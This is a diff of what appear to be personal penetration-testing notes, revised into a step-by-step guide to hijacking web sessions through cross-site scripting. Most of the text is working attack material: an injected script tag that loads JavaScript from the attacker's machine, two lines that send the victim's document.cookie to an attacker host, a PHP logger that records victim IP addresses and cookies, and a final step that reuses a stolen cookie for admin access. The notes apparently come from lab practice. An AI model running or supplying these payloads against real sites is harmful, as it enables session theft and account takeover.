@@ -1,9 +1,17 @@
 We can use XSS for hijacking the session. 
 
-First we need to check with Paramater is vulnerable. We can tets it by nc listerner in the kali and add below script. If we get the connection, then that parameter is vulnerable 
-    "><script src=http://<Kali IP address>:<Kali Port>/script.js></script>
+Step 1) Lets check what files is the site loading, from the Network tools.
+        From this example, we can see scripts.js is loading 
 
-We need to have the PHP script called "Index.php" for capture the cookie.
+Step 2) Lets start NC listerner and run the below script to check what parameter is vulnerable.
+        "><script src=http://<Kali IP address>:<Kali Port>/script.js></script>
+        
+
+Step 3) Now we can create a file called "scripts.js" with below commands
+        document.location='http://OUR_IP/index.php?c='+document.cookie;
+        new Image().src='http://OUR_IP/index.php?c='+document.cookie;
+
+Step 4) Now that the above script is calling "index.php". We will create a file index.php as below 
 
 <?php
 if (isset($_GET['c'])) {
@@ -11,14 +19,15 @@ if (isset($_GET['c'])) {
     foreach ($list as $key => $value) {
         $cookie = urldecode($value);
         $file = fopen("cookies.txt", "a+");
-        fputs($file, "Victim IP: {$_SERVER['10.129.159.227']} | Cookie: {$cookie}\n");
+        fputs($file, "Victim IP: {$_SERVER['REMOTE_ADDR']} | Cookie: {$cookie}\n");
         fclose($file);
     }
 }
 ?>
 
 
-We can use below scripts to hijack the cookies. 
-    document.location='http://OUR_IP/index.php?c='+document.cookie;
-    new Image().src='http://OUR_IP/index.php?c='+document.cookie;
+Step 5) Run the below script in the vulnerable parameter to capture the cookie.
+        <script src=http://OUR_IP/script.js></script>
+
+Step 6) We have successfully captured the cookie, we can add it to the seesion and after refresh we get admin access. 
 
